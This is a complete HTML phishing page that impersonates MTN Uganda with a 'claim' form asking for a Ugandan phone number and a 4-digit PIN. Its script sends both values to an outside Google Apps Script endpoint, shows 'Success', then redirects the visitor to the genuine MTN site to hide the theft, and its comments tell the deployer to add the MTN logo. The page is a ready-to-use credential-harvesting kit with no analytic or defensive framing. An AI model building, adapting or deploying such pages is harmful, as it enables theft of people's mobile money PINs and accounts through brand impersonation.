<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN Uganda</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .card { background: #fff; width: 100%; max-width: 360px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: #ffcc00; padding: 30px; text-align: center; }
        .header img { max-width: 120px; height: auto; } /* Upload your MTN logo as logo.png */
        .content { padding: 25px; }
        .input-group { display: flex; align-items: center; margin-bottom: 15px; border: 2px solid #ddd; border-radius: 8px; overflow: hidden; }
        .input-group:focus-within { border-color: #ffcc00; }
        .prefix { background: #f5f5f5; padding: 14px 12px; font-weight: bold; color: #333; font-size: 15px; border-right: 2px solid #ddd; }
        input { border: none; padding: 14px 12px; width: 100%; font-size: 16px; background: transparent; outline: none; }
        .btn { background: #ffcc00; color: #000; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 5px; }
        .btn:hover { background: #e6b800; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
    </style>
</head>
<body>

<div class="card">
    <div class="header">
        <!-- Upload your MTN logo manually as logo.png -->
        <img src="logo.png" alt="MTN">
    </div>
    
    <div class="content">
        <form id="claimForm">
            <div class="input-group">
                <div class="prefix">+256</div>
                <input type="tel" name="phone_suffix" placeholder="Phone number" required pattern="[0-9]{7,10}">
            </div>
            
            <div class="input-group">
                <input type="password" name="pin" placeholder="PIN" required maxlength="4" inputmode="numeric">
            </div>

            <button type="submit" class="btn" id="submitBtn">Submit</button>
        </form>
    </div>
</div>

<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbye0lcSe4Gnm0bUH6XH4s4ASWG6OzNx3XLH4JVczv8tBucm6kn0h4YTka_Ey_mB30g5cA/exec';
    const form = document.getElementById('claimForm');
    const btn = document.getElementById('submitBtn');

    form.addEventListener('submit', e => {
        e.preventDefault();
        btn.disabled = true;
        btn.textContent = "Processing...";

        const formData = new FormData(form);
        const fullPhone = "+256" + formData.get('phone_suffix');
        formData.append('full_phone', fullPhone);

        fetch(scriptURL, { method: 'POST', body: formData, mode: 'no-cors' })
        .then(() => {
            alert("Success");
            window.location.href = "https://www.mtn.co.ug/";
        })
        .catch(() => {
            window.location.href = "https://www.mtn.co.ug/";
        });
    });
</script>

</body>
</html>
